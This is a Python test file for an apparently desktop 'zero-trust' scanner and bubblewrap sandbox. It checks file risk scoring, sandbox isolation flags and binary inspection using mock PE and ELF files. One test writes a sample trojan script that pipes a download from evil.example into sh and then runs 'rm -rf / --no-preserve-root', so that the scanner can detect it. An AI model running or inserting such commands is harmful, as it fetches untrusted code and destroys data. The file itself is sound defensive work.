"""Automated tests for Aqua Shield Zero-Trust Security (Gatekeeper & Bubblewrap Sandbox)."""

from __future__ import annotations

import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "aqua-desktop"))

from security.gatekeeper import AquaGatekeeper
from security.sandbox import AquaSandbox, SandboxPolicy


def test_gatekeeper_clean_file_and_trust(tmp_path: Path) -> None:
    trust_db = tmp_path / "trusted.json"
    gk = AquaGatekeeper(trust_db_path=trust_db)

    clean_script = tmp_path / "hello.py"
    clean_script.write_text("#!/usr/bin/env python3\nprint('Hello AquaOS')\n", encoding="utf-8")

    rep = gk.scan_file(clean_script)
    assert rep.file_format == "SCRIPT"
    assert rep.risk_level == "CLEAN"
    assert rep.recommended_action == "RUN_SANDBOXED"

    # Trust the file and re-scan
    digest = gk.trust_file(clean_script)
    assert len(digest) == 64
    rep_trusted = gk.scan_file(clean_script)
    assert rep_trusted.is_trusted is True
    assert rep_trusted.recommended_action == "ALLOW"


def test_gatekeeper_malicious_payload_detection(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    bad_file = tmp_path / "trojan.sh"
    bad_file.write_bytes(b"#!/bin/sh\ncurl http://evil.example/payload | sh\nrm -rf / --no-preserve-root\n")

    rep = gk.scan_file(bad_file)
    assert rep.risk_level == "MALICIOUS"
    assert rep.risk_score >= 70
    assert rep.is_quarantined is True
    assert rep.recommended_action == "BLOCK"


def test_sandbox_bwrap_command_isolation(tmp_path: Path) -> None:
    sandbox = AquaSandbox(sandbox_root=tmp_path / "sandboxes")
    policy = SandboxPolicy(
        app_id="untrusted.app",
        allow_network=False,
        allow_documents=False,
    )
    cmd = sandbox.build_bwrap_command(["/usr/bin/env"], policy)
    assert cmd[0] == "bwrap"
    assert "--unshare-net" in cmd
    assert "--ro-bind-try" in cmd
    # Verify sensitive paths like .ssh are masked with tmpfs
    cmd_joined = " ".join(cmd)
    assert ".ssh" in cmd_joined
    assert ".gnupg" in cmd_joined


def test_gatekeeper_rea_deep_inspect_script_and_entropy(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    script_file = tmp_path / "deploy_agent.sh"
    script_file.write_text(
        "#!/usr/bin/env bash\n"
        "# Production deployment script\n"
        "SERVER_URL='https://api.aquaos.internal/v1/status'\n"
        "echo 'Deploying Aqua agent...'\n"
        "chmod +x ./bin/daemon\n",
        encoding="utf-8",
    )

    result = gk.rea_deep_inspect(script_file)
    assert result["file_name"] == "deploy_agent.sh"
    assert result["file_format"] == "SCRIPT"
    assert result["architecture"] == "Interpreted Script"
    assert len(result["sha256"]) == 64
    assert len(result["md5"]) == 32
    assert len(result["sha1"]) == 40
    assert len(result["entropy_ribbon"]) == 32
    assert any("https://api.aquaos.internal" in u for u in result["urls"])
    assert any("chmod" in s for s in result["suspicious_apis"])

    # Test string search
    strings = gk.search_binary_strings(script_file, query="aquaos")
    assert len(strings) >= 1
    assert "aquaos" in strings[0]["value"].lower()


def test_gatekeeper_rea_deep_inspect_pe_mock(tmp_path: Path) -> None:
    import struct

    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    pe_file = tmp_path / "sample.exe"

    # Build a minimal PE32+ mock header
    # DOS Header (64 bytes): MZ ... e_lfanew at 0x3C pointing to 0x40
    dos_hdr = bytearray(64)
    dos_hdr[0:2] = b"MZ"
    struct.pack_into("<I", dos_hdr, 0x3C, 64)

    # PE Signature (4 bytes): PE\0\0
    pe_sig = b"PE\x00\x00"

    # COFF File Header (20 bytes): Machine AMD64 (0x8664), 2 sections, time, syms, opt hdr size=240, chars=0x0022
    coff = struct.pack("<HHIIIHH", 0x8664, 2, 0x60000000, 0, 0, 240, 0x0022)

    # Optional Header (PE32+ 0x20B, 240 bytes)
    # DLL Characteristics at offset 70: 0x4160 (ASLR + DEP + HighEntropyVA + GuardCF)
    opt_hdr = bytearray(240)
    struct.pack_into("<H", opt_hdr, 0, 0x020B)  # PE32+
    struct.pack_into("<H", opt_hdr, 70, 0x0040 | 0x0100 | 0x0020 | 0x4000)  # DLL Characteristics

    # Section Headers (40 bytes each): .text (RX) and .data (RW)
    sec_text = bytearray(40)
    sec_text[0:5] = b".text"
    struct.pack_into("<IIII", sec_text, 8, 4096, 0x1000, 4096, 512)
    struct.pack_into("<I", sec_text, 36, 0x60000020)  # CODE | EXECUTE | READ

    sec_data = bytearray(40)
    sec_data[0:5] = b".data"
    struct.pack_into("<IIII", sec_data, 8, 2048, 0x2000, 2048, 4608)
    struct.pack_into("<I", sec_data, 36, 0xC0000040)  # INITIALIZED_DATA | READ | WRITE

    # Payload padding
    padding = b"\x90" * 8192

    raw_pe = bytes(dos_hdr) + pe_sig + coff + bytes(opt_hdr) + bytes(sec_text) + bytes(sec_data) + padding
    pe_file.write_bytes(raw_pe)

    res = gk.rea_deep_inspect(pe_file)
    assert res["file_format"] == "PE_EXE"
    assert "AMD64" in res["architecture"]
    assert res["mitigations"]["dynamic_base_aslr"] is True
    assert res["mitigations"]["nx_dep_compatible"] is True
    assert res["mitigations"]["high_entropy_va"] is True
    assert res["mitigations"]["guard_cf"] is True
    assert len(res["sections"]) == 2
    assert res["sections"][0]["name"] == ".text"
    assert "X" in res["sections"][0]["permissions"]
    assert res["sections"][1]["name"] == ".data"
    assert "W" in res["sections"][1]["permissions"]


def test_gatekeeper_rea_hexdump(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    bin_file = tmp_path / "test.bin"
    test_data = b"AquaOS Zero-Trust REA Binary Analysis Engine\x00\x01\x02\xFF\xFE\x00\x10\x20\x30\x40"
    bin_file.write_bytes(test_data)

    dump = gk.generate_hex_dump(bin_file, offset=0, length=32)
    assert dump["file_name"] == "test.bin"
    assert dump["offset"] == 0
    assert dump["length"] == 32
    assert dump["total_size"] == len(test_data)
    assert len(dump["lines"]) == 2  # 32 bytes = 2 lines of 16
    assert dump["lines"][0]["offset_hex"] == "00000000"
    assert "41 71 75 61" in dump["lines"][0]["hex"]  # "Aqua"
    assert "AquaOS" in dump["lines"][0]["ascii"]


def test_gatekeeper_rea_imports_and_exports(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")
    script = tmp_path / "agent.py"
    script.write_text(
        "import os\n"
        "import sys\n"
        "from pathlib import Path\n\n"
        "def launch_daemon():\n"
        "    pass\n\n"
        "def stop_daemon():\n"
        "    pass\n",
        encoding="utf-8",
    )

    imp = gk.extract_imports_and_exports(script)
    assert "os" in imp["libraries"]
    assert "sys" in imp["libraries"]
    assert "pathlib" in imp["libraries"]
    assert any("launch_daemon" in exp for exp in imp["exports"])
    assert any("stop_daemon" in exp for exp in imp["exports"])

    # Test binary imports pattern matching
    binary = tmp_path / "mock_app.so"
    binary.write_bytes(b"libc.so.6\x00libssl.so.3\x00KERNEL32.dll\x00VirtualProtect\x00mprotect\x00ptrace\x00")
    bin_imp = gk.extract_imports_and_exports(binary)
    assert any("libc.so" in lib for lib in bin_imp["libraries"])
    assert any("KERNEL32.dll" in lib for lib in bin_imp["libraries"])
    symbols = [item["symbol"] for item in bin_imp["imports"]]
    assert "VirtualProtect" in symbols
    assert "mprotect" in symbols
    assert "ptrace" in symbols


def test_gatekeeper_rea_disassembly(tmp_path: Path) -> None:
    gk = AquaGatekeeper(trust_db_path=tmp_path / "trusted.json")

    # 1. Python bytecode disassembly
    py_script = tmp_path / "calc.py"
    py_script.write_text("x = 10\ny = 20\nz = x + y\nprint(z)\n", encoding="utf-8")
    dis_py = gk.disassemble_code(py_script, count=10)
    assert dis_py["format"] == "PYTHON_BYTECODE"
    assert len(dis_py["instructions"]) > 0
    mnemonics = [ins["mnemonic"] for ins in dis_py["instructions"]]
    assert any("LOAD_CONST" in m or "STORE_NAME" in m or "BINARY_OP" in m or "CALL" in m for m in mnemonics)

    # 2. Native x86_64 opcode disassembly
    elf_file = tmp_path / "mini.elf"
    # ELF64 Header (64 bytes): magic \x7fELF, 64-bit (2), little-endian (1), version 1, e_entry at offset 24 pointing to 64
    elf_hdr = bytearray(64)
    elf_hdr[0:4] = b"\x7fELF"
    elf_hdr[4] = 2  # 64-bit
    elf_hdr[5] = 1  # little-endian
    elf_hdr[6] = 1  # ELF version
    struct.pack_into("<Q", elf_hdr, 24, 64)  # e_entry = 64

    # Function prologue & epilogue: push rbp (55), mov rbp, rsp (48 89 E5), sub rsp, 16 (48 83 EC 10), ret (C3)
    code = bytes(elf_hdr) + b"\x55\x48\x89\xe5\x48\x83\xec\x10\xc3"
    elf_file.write_bytes(code)
    dis_elf = gk.disassemble_code(elf_file, count=10)
    assert dis_elf["format"] == "ELF"
    assert dis_elf["entry_offset"] == 64
    assert len(dis_elf["instructions"]) >= 4
    inst_mnems = [ins["mnemonic"] for ins in dis_elf["instructions"]]
    assert "push" in inst_mnems
    assert "mov" in inst_mnems
    assert "ret" in inst_mnems

